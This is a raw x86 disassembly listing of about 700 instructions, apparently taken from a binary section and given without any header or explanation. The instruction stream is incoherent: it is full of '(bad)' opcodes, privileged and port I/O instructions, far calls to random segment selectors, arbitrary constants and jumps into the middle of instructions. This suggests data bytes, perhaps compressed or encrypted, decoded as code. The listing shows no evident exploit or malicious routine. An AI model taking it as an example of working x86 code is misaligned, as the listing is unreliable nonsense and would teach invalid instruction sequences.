  43a98d:	and    DWORD PTR [ebp-0x80],edx
  43a990:	push   0xed2bca23
  43a995:	inc    esi
  43a996:	xchg   DWORD PTR [ecx+0xf874590],ecx
  43a99c:	loop   0x43a9d4
  43a99e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a99f:	sub    ch,dl
  43a9a1:	test   al,0xa0
  43a9a3:	jmp    0x43aa17
  43a9a5:	arpl   WORD PTR [ecx],ax
  43a9a7:	ins    BYTE PTR es:[edi],dx
  43a9a8:	and    dl,bl
  43a9aa:	ret    0xdb59
  43a9ad:	adc    eax,0xd5ba20b5
  43a9b2:	adc    ch,bh
  43a9b4:	or     eax,0xddfb09ca
  43a9b9:	pusha  
  43a9ba:	imul   ebp,ebx,0xfffffffe
  43a9bd:	sbb    DWORD PTR [esi+ebp*4-0x12f77e21],edi
  43a9c4:	dec    ebx
  43a9c5:	mov    ds:0x20015768,eax
  43a9ca:	xor    eax,0x7680e28b
  43a9cf:	adc    BYTE PTR [eax+0x2521a77d],dh
  43a9d5:	scas   eax,DWORD PTR es:[edi]
  43a9d6:	or     eax,DWORD PTR [ebp+0x2bc529a0]
  43a9dc:	mov    esp,0x6e0afe1f
  43a9e1:	or     ecx,DWORD PTR [ebx+0x26]
  43a9e4:	repz pop ebx
  43a9e6:	pop    ebp
  43a9e7:	add    eax,0xd7c2c79b
  43a9ec:	lea    eax,[esi]
  43a9ee:	arpl   WORD PTR [ecx+0x6c],dx
  43a9f1:	je     0x43a9c8
  43a9f3:	fs push cs
  43a9f5:	pop    es
  43a9f6:	ds dec ebx
  43a9f8:	mov    ebx,0xe8e00aea
  43a9fd:	add    cl,BYTE PTR [ebp-0x41]
  43aa00:	sub    al,0x74
  43aa02:	mov    dh,0x82
  43aa04:	pop    ebp
  43aa05:	aad    0xf
  43aa07:	xchg   ebp,eax
  43aa08:	mov    esi,0x255592e
  43aa0d:	jbe    0x43aa5f
  43aa0f:	mov    ch,0x8b
  43aa11:	aad    0x35
  43aa13:	scas   eax,DWORD PTR es:[edi]
  43aa14:	xchg   edx,eax
  43aa15:	mov    dl,0xb0
  43aa17:	or     eax,0x85bf6c05
  43aa1c:	sbb    ch,BYTE PTR [ecx]
  43aa1e:	cwde   
  43aa1f:	mov    edi,0xdb6b934b
  43aa24:	push   es
  43aa25:	test   al,0xeb
  43aa27:	cmp    eax,0x7b179f34
  43aa2c:	lds    edx,FWORD PTR [esi-0x4b]
  43aa2f:	sbb    eax,0x711c7501
  43aa34:	pop    esp
  43aa35:	cdq    
  43aa36:	fwait
  43aa37:	ja     0x43aa50
  43aa39:	mov    edx,0xf286b808
  43aa3e:	not    BYTE PTR [ebx]
  43aa40:	mov    fs,WORD PTR [eax+eax*2-0xb]
  43aa44:	jbe    0x43aa96
  43aa46:	fmul   QWORD PTR [edx-0x23]
  43aa49:	sbb    bh,BYTE PTR [eax-0x6]
  43aa4c:	xor    al,BYTE PTR ss:[ebx]
  43aa4f:	lods   eax,DWORD PTR ds:[esi]
  43aa50:	mov    ds:0x7c502a03,eax
  43aa55:	daa    
  43aa56:	pop    cx
  43aa58:	pop    edx
  43aa59:	sub    BYTE PTR [eax+0x6c],dl
  43aa5c:	push   ebx
  43aa5d:	cmp    eax,0xb969107
  43aa62:	loopne 0x43aaba
  43aa64:	and    BYTE PTR [ecx+0x7629717a],al
  43aa6a:	or     BYTE PTR [ebx],al
  43aa6c:	mov    al,0xb0
  43aa6e:	mov    al,ds:0xcf51e50b
  43aa73:	fcom   DWORD PTR [ebp+eax*2+0x17]
  43aa77:	mov    ebx,0x4e81a1b2
  43aa7c:	int3   
  43aa7d:	push   ebp
  43aa7e:	shl    BYTE PTR [esi+0x482ab581],0x38
  43aa85:	push   esi
  43aa86:	ins    DWORD PTR es:[edi],dx
  43aa87:	sbb    eax,DWORD PTR [edx]
  43aa89:	ss and eax,0x7de4cbf1
  43aa8f:	out    dx,al
  43aa90:	mov    esp,0xd7815292
  43aa95:	lods   eax,DWORD PTR ds:[esi]
  43aa96:	fisubr DWORD PTR [eax+0x38]
  43aa99:	mov    bl,BYTE PTR [eax+0x50]
  43aa9c:	pop    esp
  43aa9d:	stos   BYTE PTR es:[edi],al
  43aa9e:	pop    ebp
  43aa9f:	shr    BYTE PTR [ebp-0x24399787],0x7a
  43aaa6:	test   BYTE PTR [edx],0x57
  43aaa9:	ins    BYTE PTR es:[edi],dx
  43aaaa:	sub    BYTE PTR [eax+0x65],dl
  43aaad:	fnsave [edi-0x48a4fb8a]
  43aab3:	out    dx,eax
  43aab4:	out    dx,eax
  43aab5:	mov    BYTE PTR fs:[eax+0x3a],bh
  43aab9:	sub    DWORD PTR [eax-0x75fe4b82],edx
  43aabf:	lods   eax,DWORD PTR ds:[esi]
  43aac0:	and    al,0x2c
  43aac2:	fdiv   st(5),st
  43aac4:	int    0x55
  43aac6:	mov    al,0x29
  43aac8:	and    BYTE PTR [esi*2+0x56d2dbe7],cl
  43aacf:	fdiv   st,st(7)
  43aad1:	lea    ecx,[edi+ebx*8-0x7ebb7a77]
  43aad8:	mov    bl,0x9d
  43aada:	sub    BYTE PTR [eax],al
  43aadc:	sub    al,0x6d
  43aade:	jp     0x43aa79
  43aae0:	lds    edx,FWORD PTR [ecx-0x75764b9c]
  43aae6:	(bad)  
  43aae7:	mov    ebp,0xfa8a7ad3
  43aaec:	sub    BYTE PTR [edx-0xedebf8b],bh
  43aaf2:	outs   dx,BYTE PTR ds:[esi]
  43aaf3:	hlt    
  43aaf4:	neg    al
  43aaf6:	add    eax,0xfc699b54
  43aafb:	popa   
  43aafc:	inc    edi
  43aafd:	sub    BYTE PTR [esp+ebx*8-0x4a],bh
  43ab01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ab02:	sub    BYTE PTR [esi+0x17e2d434],bh
  43ab08:	out    0xf0,al
  43ab0a:	jo     0x43ab3f
  43ab0c:	mov    ah,0x3d
  43ab0e:	int    0x9f
  43ab10:	pop    esp
  43ab11:	hlt    
  43ab12:	pop    ecx
  43ab13:	pop    edi
  43ab14:	cmp    eax,0xd8a9a325
  43ab19:	push   ebp
  43ab1a:	aaa    
  43ab1b:	bound  esi,QWORD PTR [ecx+0x3b45deb2]
  43ab21:	test   al,0x68
  43ab23:	pusha  
  43ab24:	dec    ebp
  43ab25:	or     al,0xb8
  43ab27:	js     0x43ab54
  43ab29:	mov    al,0x82
  43ab2b:	fadd   DWORD PTR ds:0x56ac7d6d
  43ab31:	or     DWORD PTR [eax+ebx*8-0x67d97a4a],esp
  43ab38:	or     bh,al
  43ab3a:	das    
  43ab3b:	push   esi
  43ab3c:	rcl    DWORD PTR [eax-0x2b],1
  43ab3f:	sub    bh,BYTE PTR [eax-0x7673752c]
  43ab45:	sahf   
  43ab46:	jno    0x43ab5e
  43ab48:	or     dl,BYTE PTR [esi]
  43ab4a:	sbb    ah,BYTE PTR [ebx]
  43ab4c:	mov    fs,WORD PTR [esi+0x177d6a8f]
  43ab52:	sbb    ch,BYTE PTR [eax]
  43ab54:	ss nop
  43ab56:	mov    ah,0x22
  43ab58:	pop    edx
  43ab59:	jo     0x43aba7
  43ab5b:	sub    eax,esp
  43ab5d:	test   BYTE PTR [ecx-0x7eb0b896],0x36
  43ab64:	stos   BYTE PTR es:[edi],al
  43ab65:	xor    al,0xa0
  43ab67:	and    DWORD PTR [eax-0x6d56e6f3],ecx
  43ab6d:	cld    
  43ab6e:	iret   
  43ab6f:	mov    DWORD PTR [edx-0x5e35d6a5],eax
  43ab75:	in     al,dx
  43ab76:	jne    0x43abd9
  43ab78:	mov    dh,0x65
  43ab7a:	mov    ebp,DWORD PTR [ebp+0x4549a1ba]
  43ab80:	jno    0x43abed
  43ab82:	es das 
  43ab84:	loopne 0x43abc8
  43ab86:	pop    ebx
  43ab87:	or     BYTE PTR [esi],ah
  43ab89:	mov    ds:0x9e134cda,al
  43ab8e:	mov    al,ds:0x881801b8
  43ab93:	repnz rcl DWORD PTR [edx-0x148bfacc],1
  43ab9a:	cmp    ebp,ebx
  43ab9c:	lods   eax,DWORD PTR ds:[esi]
  43ab9d:	fild   WORD PTR [esi+0x18408371]
  43aba3:	mov    ds:0x4d546a2e,al
  43aba8:	fidivr WORD PTR [edx+0x296c6e55]
  43abae:	mov    ch,0xb7
  43abb0:	scas   al,BYTE PTR es:[edi]
  43abb1:	inc    ecx
  43abb2:	push   edx
  43abb3:	sbb    eax,0xa6da1708
  43abb8:	or     BYTE PTR [ebx+0x6a7ac35f],cl
  43abbe:	mov    ebx,esp
  43abc0:	inc    esi
  43abc1:	push   esp
  43abc2:	push   ebx
  43abc3:	adc    DWORD PTR [ecx],edx
  43abc5:	and    al,0x92
  43abc7:	test   al,0x36
  43abc9:	add    ebp,eax
  43abcb:	xor    esp,DWORD PTR [ebx]
  43abcd:	and    DWORD PTR [ebx],ebp
  43abcf:	adc    al,0x17
  43abd1:	mov    dh,0x26
  43abd3:	xchg   esi,eax
  43abd4:	pop    ecx
  43abd5:	gs push ebp
  43abd7:	cs push ecx
  43abd9:	(bad)  
  43abda:	mov    esi,0x8a536a82
  43abdf:	dec    ecx
  43abe0:	mov    esp,0xdc15a98b
  43abe5:	cmp    al,BYTE PTR [eax]
  43abe7:	mov    ebp,0x4cefeec
  43abec:	clc    
  43abed:	push   esp
  43abee:	push   ebp
  43abef:	inc    edi
  43abf0:	pop    edx
  43abf1:	mov    ah,0xc6
  43abf3:	into   
  43abf4:	inc    ebp
  43abf5:	add    bh,BYTE PTR [eax+0xab550b1]
  43abfb:	cmp    BYTE PTR [ebp-0x492413c3],ah
  43ac01:	stos   BYTE PTR es:[edi],al
  43ac02:	mov    ecx,DWORD PTR [edi+eax*1]
  43ac05:	dec    edi
  43ac06:	xor    DWORD PTR [ebx+0x51d5508c],eax
  43ac0c:	sbb    esp,DWORD PTR [eax-0x63]
  43ac0f:	jbe    0x43ac00
  43ac11:	push   esi
  43ac12:	add    eax,ebx
  43ac14:	adc    ch,ch
  43ac16:	mov    ds:0x61238bb8,al
  43ac1b:	or     eax,0x406d5950
  43ac20:	pop    ebx
  43ac21:	inc    edi
  43ac22:	call   0xd531:0x2b022062
  43ac29:	inc    esi
  43ac2a:	inc    ebx
  43ac2b:	add    eax,0xcc00d8ee
  43ac30:	sbb    eax,0x16685d41
  43ac35:	shl    DWORD PTR [ebx-0x25],cl
  43ac38:	ins    DWORD PTR es:[edi],dx
  43ac39:	inc    ebx
  43ac3a:	mov    ebx,0xe0b6d4b0
  43ac3f:	ret    0x474f
  43ac42:	loopne 0x43ac4d
  43ac44:	shl    ebp,0x17
  43ac47:	enter  0x1ad,0xe0
  43ac4b:	push   edx
  43ac4c:	adc    DWORD PTR [ebp+0x26870a3b],edi
  43ac52:	push   ebp
  43ac53:	rol    DWORD PTR [ebp+eax*8-0x5e],1
  43ac57:	mov    al,ds:0xd16e6a9e
  43ac5c:	add    BYTE PTR [ebp+edx*8+0x570c7450],dh
  43ac63:	cmp    BYTE PTR [ecx],0x6d
  43ac66:	cmp    DWORD PTR [edi-0x44e898eb],esi
  43ac6c:	(bad)  
  43ac6d:	fidiv  DWORD PTR [ebp*1-0x4777e495]
  43ac74:	sbb    eax,0x218fcda9
  43ac79:	cdq    
  43ac7a:	mov    ecx,0x1342ce3
  43ac7f:	jo     0x43ac09
  43ac81:	mov    edx,0x7ad172cd
  43ac86:	push   esp
  43ac87:	inc    esp
  43ac88:	or     eax,DWORD PTR [eax]
  43ac8a:	lea    edx,[edi]
  43ac8c:	(bad)  [esi+0x5e]
  43ac8f:	fsub   DWORD PTR ds:0x528a93b
  43ac95:	add    ah,ah
  43ac97:	mov    bl,0x2f
  43ac99:	mov    edi,0x5b44d33
  43ac9e:	ins    DWORD PTR es:[edi],dx
  43ac9f:	(bad)  
  43aca0:	call   0xadc6:0x3a5d0356
  43aca7:	add    DWORD PTR [eax-0x28cd9f2f],0x36
  43acae:	arpl   WORD PTR [ebp+0x57],si
  43acb1:	les    ebp,FWORD PTR [ebp+0x42e8e85]
  43acb7:	and    al,BYTE PTR [edi+0x3e]
  43acba:	dec    ebp
  43acbb:	je     0x43ad36
  43acbd:	popa   
  43acbe:	add    al,0x94
  43acc0:	push   0xffffff91
  43acc2:	add    BYTE PTR [eax],dl
  43acc4:	or     BYTE PTR [ebx-0x7452488b],ch
  43acca:	xchg   BYTE PTR [eax+0x3cce0f7b],ch
  43acd0:	sub    al,0x8f
  43acd2:	sub    DWORD PTR [eax-0x76],0xbeaea1a8
  43acd9:	jmp    0x43ac60
  43acdb:	xchg   BYTE PTR [edx-0x2aa92793],cl
  43ace1:	sub    bh,BYTE PTR [ecx+0x1455d65b]
  43ace7:	fcmovne st,st(5)
  43ace9:	inc    esp
  43acea:	jp     0x43accf
  43acec:	sub    BYTE PTR [ebp-0x41],bh
  43acef:	(bad)  
  43acf0:	mov    dh,0xa1
  43acf2:	loop   0x43aca6
  43acf4:	repz xchg esi,eax
  43acf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43acf7:	fnstsw WORD PTR [ecx+ecx*1+0x404d80bd]
  43acfe:	mov    bh,0x98
  43ad00:	push   edi
  43ad01:	push   0x75
  43ad03:	mov    BYTE PTR [esp+ebp*2+0x5],bl
  43ad07:	test   al,0x1
  43ad09:	cmp    DWORD PTR [ebx-0x6a5f3aa4],eax
  43ad0f:	mov    dh,al
  43ad11:	push   esi
  43ad12:	int3   
  43ad13:	and    BYTE PTR [edi+0x2604bb29],al
  43ad19:	mov    eax,0x6597ac68
  43ad1e:	pop    edi
  43ad1f:	jae    0x43ad09
  43ad21:	sub    al,0xa2
  43ad23:	loop   0x43ad77
  43ad25:	popa   
  43ad26:	sbb    DWORD PTR [ecx],esi
  43ad28:	xlat   BYTE PTR ds:[ebx]
  43ad29:	jnp    0x43ad05
  43ad2b:	mov    al,0x75
  43ad2d:	push   esp
  43ad2e:	ins    BYTE PTR es:[edi],dx
  43ad2f:	mov    ecx,0x39fb5fc2
  43ad34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ad35:	iret   
  43ad36:	call   0xd7e2:0x82b6ed8a
  43ad3d:	push   esi
  43ad3e:	push   ds
  43ad3f:	adc    DWORD PTR [eax+eiz*4],esp
  43ad42:	in     al,0x65
  43ad44:	jmp    0x43ad88
  43ad46:	stos   DWORD PTR es:[edi],eax
  43ad47:	jl     0x43adad
  43ad49:	(bad)  
  43ad4a:	fs mov dl,0x75
  43ad4d:	ja     0x43ad2b
  43ad4f:	mov    edx,0x705019aa
  43ad54:	add    eax,0xbe8682
  43ad59:	adc    al,0xe1
  43ad5b:	and    BYTE PTR [edx+0x47],ch
  43ad5e:	add    DWORD PTR [ebp+ebx*1+0x29],esi
  43ad62:	fild   DWORD PTR [ecx+0x54]
  43ad65:	mov    ebx,0xcede81b7
  43ad6a:	loop   0x43acf9
  43ad6c:	outs   dx,BYTE PTR ds:[esi]
  43ad6d:	adc    BYTE PTR [eax+0xb],dl
  43ad70:	inc    ecx
  43ad71:	shl    DWORD PTR [edi-0x2495ff98],1
  43ad77:	imul   eax,DWORD PTR [esi-0x7c],0x38b4f862
  43ad7e:	mov    cl,0xab
  43ad80:	mov    ds:0x76a4b785,al
  43ad85:	xchg   DWORD PTR [esi],edx
  43ad87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ad88:	add    al,bl
  43ad8a:	add    al,0xbe
  43ad8c:	fidivr WORD PTR [ebx]
  43ad8e:	jae    0x43ad66
  43ad90:	mov    dh,0x51
  43ad92:	adc    BYTE PTR [eax],0xe3
  43ad95:	cmp    DWORD PTR [eax-0x44e023f2],edi
  43ad9b:	inc    ecx
  43ad9c:	cs loopne 0x43ada9
  43ad9f:	xchg   edx,eax
  43ada0:	ins    BYTE PTR es:[edi],dx
  43ada1:	sar    DWORD PTR [eax+0x63],0x59
  43ada5:	lea    ecx,[esi]
  43ada7:	mov    ds:0x1f4ac46d,al
  43adac:	fisttp QWORD PTR [ebx+0x1740d8b4]
  43adb2:	mov    dh,0x8
  43adb4:	enter  0xe5e4,0xea
  43adb8:	mov    ebx,0xd160b4f8
  43adbd:	and    ch,BYTE PTR [eax+0x0]
  43adc0:	(bad)  
  43adc1:	mov    esp,0x6d512b89
  43adc6:	mov    ebx,0x53f640c
  43adcb:	jnp    0x43ad68
  43adcd:	jbe    0x43ae10
  43adcf:	xor    al,0x0
  43add1:	lds    esi,FWORD PTR [esi-0x40]
  43add4:	mov    DWORD PTR [edx],eax
  43add6:	cmp    bh,BYTE PTR [eax+ebx*1+0x36]
  43adda:	cmp    ch,BYTE PTR [edx+0x4602342e]
  43ade0:	xor    dl,dh
  43ade2:	inc    ebp
  43ade3:	push   0x165c0153
  43ade8:	mov    ss,WORD PTR [ecx+0x25]
  43adeb:	mov    BYTE PTR [esi+0x6d8008ea],bl
  43adf1:	popa   
  43adf2:	mov    al,0x5
  43adf4:	mov    esp,0xaec5e71
  43adf9:	outs   dx,BYTE PTR ds:[esi]
  43adfa:	add    eax,0x3c5ea14a
  43adff:	fcmovu st,st(0)
  43ae01:	add    DWORD PTR [edx-0x13aefca0],esp
  43ae07:	in     al,dx
  43ae08:	loopne 0x43ae1f
  43ae0a:	in     eax,0xb7
  43ae0c:	cmp    ah,al
  43ae0e:	and    BYTE PTR ds:0x5400f96a,0x1d
  43ae15:	test   DWORD PTR ds:0x3de7b045,ebx
  43ae1b:	push   edx
  43ae1c:	cmp    esp,ecx
  43ae1e:	dec    edi
  43ae1f:	push   ebx
  43ae20:	push   esp
  43ae21:	frstpm(287 only) 
  43ae23:	pop    ds
  43ae24:	add    BYTE PTR [eax-0x75bb5487],bh
  43ae2a:	push   cs
  43ae2b:	pop    ebp
  43ae2c:	adc    BYTE PTR [ebp+0x67c6ed45],ch
  43ae32:	adc    bl,ch
  43ae34:	inc    eax
  43ae35:	mov    al,0x3
  43ae37:	mov    dh,0x6b
  43ae39:	add    dh,BYTE PTR [edi+eiz*1-0x7f791e0f]
  43ae40:	outs   dx,BYTE PTR ds:[esi]
  43ae41:	xor    eax,0x579dfc89
  43ae46:	icebp  
  43ae47:	popa   
  43ae48:	fadd   DWORD PTR [esp+edx*8]
  43ae4b:	test   DWORD PTR ds:0x1fc03fa0,ebp
  43ae51:	add    bh,BYTE PTR [edx]
  43ae53:	adc    BYTE PTR [eax-0x5d],dh
  43ae56:	and    ebp,DWORD PTR [ebx]
  43ae58:	pop    edx
  43ae59:	fiadd  WORD PTR [eax+0x1e]
  43ae5c:	mov    bh,0x4a
  43ae5e:	push   ecx
  43ae5f:	dec    ebp
  43ae60:	jns    0x43adf7
  43ae62:	call   0x6a6acd2e
  43ae67:	mov    DWORD PTR [esi+0x1a90f56d],esi
  43ae6d:	xchg   edi,eax
  43ae6e:	jmp    0xa7091b10
  43ae73:	test   al,0xad
  43ae75:	or     BYTE PTR ds:0xa59d80a0,0x6d
  43ae7c:	fist   DWORD PTR [eax]
  43ae7e:	gs ret 
  43ae80:	dec    esi
  43ae81:	pop    edi
  43ae82:	inc    esp
  43ae83:	pop    ecx
  43ae84:	test   esi,edi
  43ae86:	mov    bh,0xb6
  43ae88:	inc    eax
  43ae89:	mov    ah,0x81
  43ae8b:	xlat   BYTE PTR ds:[ebx]
  43ae8c:	in     eax,0xdb
  43ae8e:	pop    ecx
  43ae8f:	xor    bl,BYTE PTR [esi+0x41da0af7]
  43ae95:	inc    ecx
  43ae96:	retf   0xd54a
  43ae99:	or     ebx,DWORD PTR [ebp+0x5]
  43ae9c:	ins    DWORD PTR es:[edi],dx
  43ae9d:	xchg   edx,eax
  43ae9e:	pop    es
  43ae9f:	rol    DWORD PTR [eax+0x4396fd0f],cl
  43aea5:	dec    ebp
  43aea6:	mov    cl,0x44
  43aea8:	push   es
  43aea9:	pop    ds
  43aeaa:	fld    DWORD PTR [ebx+0x16161653]
  43aeb0:	outs   dx,BYTE PTR ss:[esi]
  43aeb2:	inc    eax
  43aeb3:	xchg   ecx,eax
  43aeb4:	fld    DWORD PTR [esi+0x77]
  43aeb7:	fscale 
  43aeb9:	adc    BYTE PTR [edi],dl
  43aebb:	mov    dh,0x5
  43aebd:	stc    
  43aebe:	pushf  
  43aebf:	in     al,dx
  43aec0:	iret   
  43aec1:	jo     0x43aeb3
  43aec3:	call   0x421f09cb
  43aec8:	ret    
  43aec9:	cmp    BYTE PTR [ecx+0x41],ch
  43aecc:	cwde   
  43aecd:	stc    
  43aece:	and    DWORD PTR [esi+0x5b],ebp
  43aed1:	adc    edx,DWORD PTR [eax+0x4c]
  43aed4:	push   es
  43aed5:	jl     0x43aec3
  43aed7:	jge    0x43aedb
  43aed9:	outs   dx,BYTE PTR ds:[esi]
  43aeda:	and    BYTE PTR [ebp-0x43dfc523],ch
  43aee0:	nop
  43aee1:	dec    ebp
  43aee2:	inc    ecx
  43aee3:	(bad)  
  43aee4:	push   esi
  43aee5:	clc    
  43aee6:	adc    al,0xdd
  43aee8:	ss (bad) 
  43aeeb:	repnz imul ebx,DWORD PTR [edx+0x3a],0x7a
  43aef0:	adc    bh,dl
  43aef2:	test   BYTE PTR [ecx],ch
  43aef4:	push   0x13
  43aef6:	arpl   WORD PTR [edx+0x46e8fd8b],di
  43aefc:	jmp    0x6ed19147
  43af01:	jmp    0x5a02427
  43af06:	dec    ebx
  43af07:	test   DWORD PTR [ecx],ebp
  43af09:	sbb    cl,BYTE PTR [ebx-0x48eba214]
  43af0f:	sbb    bh,BYTE PTR [eax+edi*4]
  43af12:	in     al,0x51
  43af14:	call   0xbc6e:0xa9a02dc
  43af1b:	call   0x404fbdb4
  43af20:	lds    edx,FWORD PTR [esi+0x34]
  43af23:	mov    al,0xed
  43af25:	lods   eax,DWORD PTR ds:[esi]
  43af26:	imul   ebp,DWORD PTR [edx+eax*1-0x26],0x76
  43af2b:	pop    ecx
  43af2c:	(bad)  [edi+0x20f9c923]
  43af32:	mov    ah,0xaa
  43af34:	imul   edi,DWORD PTR gs:[ecx],0x7f
  43af38:	and    ch,BYTE PTR [ebx]
  43af3a:	pop    ecx
  43af3b:	stos   DWORD PTR es:[edi],eax
  43af3c:	pop    ebx
  43af3d:	mov    ebx,0x203df66d
  43af42:	push   cs
  43af43:	cwde   
  43af44:	mov    bl,0x41
  43af46:	or     dh,BYTE PTR [ebx+0x2f]
  43af49:	mov    ch,BYTE PTR [ebp+0x47]
  43af4c:	lock sub ah,bh
  43af4f:	call   0xb4586676
  43af54:	stos   BYTE PTR es:[edi],al
  43af55:	ss test al,0xab
  43af58:	xchg   DWORD PTR [eax+0x1476abcd],esi
  43af5e:	mov    cl,0x89
  43af60:	cmp    DWORD PTR [esi+ecx*1],eax
  43af63:	pusha  
  43af64:	dec    edx
  43af65:	shl    BYTE PTR [esi-0x5bd77e4f],1
  43af6b:	imul   eax,DWORD PTR [edi+0x22d1da6f],0xecb6aab6
  43af75:	fstp   QWORD PTR [ebp-0x24eefc2f]
  43af7b:	xchg   dl,bh
  43af7d:	dec    edx
  43af7e:	push   esp
  43af7f:	jecxz  0x43af15
  43af81:	ficom  DWORD PTR [esp+ebp*2-0x13]
  43af85:	inc    edx
  43af86:	dec    ecx
  43af87:	mov    dl,0xd
  43af89:	add    edi,DWORD PTR [ebx]
  43af8b:	sti    
  43af8c:	pop    ds
  43af8d:	mov    ah,0x75
  43af8f:	arpl   WORD PTR [ebx+0x9aa7b61],sp
  43af95:	data16 adc ah,BYTE PTR ds:0x76000846
  43af9c:	adc    BYTE PTR [ebx],bh
  43af9e:	out    0x14,al
  43afa0:	jmp    0xade:0x7fa21a0
  43afa7:	or     al,0x62
  43afa9:	pop    es
  43afaa:	shr    DWORD PTR [ebp+0x4d050a6d],0xa
  43afb1:	add    eax,0xed758456
  43afb6:	(bad)  
  43afb7:	ss add eax,0x1ce4cc8f
  43afbd:	fisubr DWORD PTR [eax+0x3f]
  43afc0:	mov    DWORD PTR [ebp-0x49],eax
  43afc3:	add    eax,0xfe97bc57
  43afc8:	add    eax,0x9b6baf2e
  43afcd:	mov    ds:0xa746410d,al
  43afd2:	inc    esp
  43afd3:	pop    edi
  43afd4:	fistp  WORD PTR [ebx-0x7a3ffa3e]
  43afda:	jbe    0x43aff1
  43afdc:	xlat   BYTE PTR ds:[ebx]
  43afdd:	ds sbb esp,esi
  43afe0:	pop    ecx
  43afe1:	mov    ebx,0xac35ba0a
  43afe6:	rcl    BYTE PTR [ebx-0x56],cl
  43afe9:	lods   al,BYTE PTR ds:[esi]
  43afea:	mov    bl,0x16
  43afec:	cmp    BYTE PTR [edx+0x4c414762],al
  43aff2:	jle    0x43afc8
  43aff4:	aaa    
  43aff5:	push   ds
  43aff6:	push   ecx
  43aff7:	ins    BYTE PTR es:[edi],dx
  43aff8:	dec    ecx
  43aff9:	stos   DWORD PTR es:[edi],eax
  43affa:	iret   
  43affb:	push   0x72
  43affd:	ds jb  0x43b028
  43b000:	pusha  
  43b001:	pop    ss
  43b002:	add    DWORD PTR [ebx-0x4a],esi
  43b005:	rcl    ch,cl
  43b007:	push   es
  43b008:	sub    BYTE PTR [edx+0xc],bh
  43b00b:	add    al,ch
  43b00d:	ret    
  43b00e:	bound  esi,QWORD PTR [ebp+0x7df6e283]
  43b014:	ins    BYTE PTR es:[edi],dx
  43b015:	and    BYTE PTR [esi-0x33],dl
  43b018:	leave  
  43b019:	push   edx
  43b01a:	jecxz  0x43afb6
  43b01c:	sub    BYTE PTR [edx+0x47],0x7f
  43b020:	dec    esi
  43b021:	dec    ecx
  43b022:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b023:	es ins BYTE PTR es:[edi],dx
  43b025:	lods   eax,DWORD PTR ds:[esi]
  43b026:	fdiv   DWORD PTR [esi]
  43b028:	xor    DWORD PTR [ecx],edi
  43b02a:	xlat   BYTE PTR ds:[ebx]
  43b02b:	fild   WORD PTR [ebp-0xe]
  43b02e:	fld    DWORD PTR [ecx-0x30]
  43b031:	lods   eax,DWORD PTR ds:[esi]
  43b032:	push   ecx
  43b033:	jno    0x43afbb
  43b035:	mov    al,ds:0x11b440eb
  43b03a:	aad    0x83
  43b03c:	fs push esi
  43b03e:	test   eax,0x746e2889
  43b043:	and    DWORD PTR [ebp+edx*1+0x164be365],eax
  43b04a:	sbb    cl,BYTE PTR [edx+0x33c259db]
  43b050:	test   BYTE PTR [edx],dh
  43b052:	xchg   edi,eax
  43b053:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b054:	mov    cl,BYTE PTR [ebp+0x11]
  43b057:	fld    QWORD PTR [ebx+eiz*2-0xc]
  43b05b:	jbe    0x43b08d
  43b05d:	fs push 0x2b
  43b060:	mov    ah,0xa6
  43b062:	popf   
  43b063:	push   0xffffffec
  43b065:	jle    0x43b09f
  43b067:	and    cl,BYTE PTR [eax+eax*2+0x3b]
  43b06b:	sub    BYTE PTR ds:0x18135f3,dl
  43b071:	jno    0x43b0ce
  43b073:	test   al,0x17
  43b075:	test   al,0xc8
  43b077:	push   ebp
  43b078:	fcomp  st(3)
  43b07a:	mov    edx,0xfda3628
  43b07f:	jb     0x43b00f
  43b081:	(bad)  
  43b083:	fadd   st,st(2)
  43b085:	(bad)  
  43b086:	fild   DWORD PTR ds:0x232a6e74
  43b08c:	loop   0x43b0d2
  43b08e:	push   0x6c551d5b
  43b093:	or     ah,bh
  43b095:	test   BYTE PTR [ebx+0x3b],0x69
  43b099:	stos   DWORD PTR es:[edi],eax
  43b09a:	stos   DWORD PTR es:[edi],eax
  43b09b:	or     BYTE PTR [ebp+0x24921bbe],0xa9
  43b0a2:	add    al,0x4
  43b0a4:	mov    bh,0xd6
  43b0a6:	ins    DWORD PTR es:[edi],dx
  43b0a7:	cmp    cl,BYTE PTR [edx-0x3d]
  43b0aa:	(bad)  
  43b0ab:	call   0x452c:0x865111
  43b0b2:	sbb    eax,0xb07d9825
  43b0b7:	adc    eax,0x641d6ed
  43b0bc:	jmp    0x43b111
  43b0be:	fisubr WORD PTR [ebx+0x60150092]
  43b0c4:	mov    ds:0xa06b1f9,eax
  43b0c9:	cs xor al,0x41
  43b0cc:	mov    al,0x32
  43b0ce:	stos   BYTE PTR es:[edi],al
  43b0cf:	xchg   esi,eax
  43b0d0:	(bad)  
  43b0d1:	xor    al,0x34
  43b0d3:	pminsw mm5,QWORD PTR [eax]
  43b0d6:	mov    eax,0x4f8f5bb5
  43b0db:	loopne 0x43b110
  43b0dd:	mov    dh,0x2d
  43b0df:	pop    eax
  43b0e0:	pop    eax
  43b0e1:	pop    eax
  43b0e2:	cmp    esp,eax
  43b0e4:	(bad)  
  43b0e5:	icebp  
  43b0e6:	jo     0x43b100
  43b0e8:	add    DWORD PTR [edx],edx
  43b0ea:	test   DWORD PTR [eax-0x78],ebp
  43b0ed:	pop    es
  43b0ee:	div    dl
  43b0f0:	lock dec edi
  43b0f2:	loop   0x43b0ca
  43b0f4:	outs   dx,BYTE PTR ds:[esi]
  43b0f5:	in     eax,0xe6
  43b0f7:	adc    eax,0x29f73e59
  43b0fc:	clc    
  43b0fd:	mov    ch,0xcf
  43b0ff:	imul   ebx,DWORD PTR [ebx+0x6a],0xc207ef20
  43b106:	sub    al,0x4a
  43b108:	stos   BYTE PTR es:[edi],al
  43b109:	jno    0x43b12b
  43b10b:	ss inc ecx
  43b10d:	jno    0x43b18d
  43b10f:	cmc    
  43b110:	jo     0x43b0ec
  43b112:	int3   
  43b113:	mov    bh,0xad
  43b115:	ins    DWORD PTR es:[edi],dx
  43b116:	mov    ebx,0x9edc06ba
  43b11b:	pushf  
  43b11c:	jno    0x43b0b0
  43b11e:	xchg   edi,eax
  43b11f:	mov    esp,0xda0830c5
  43b124:	inc    esp
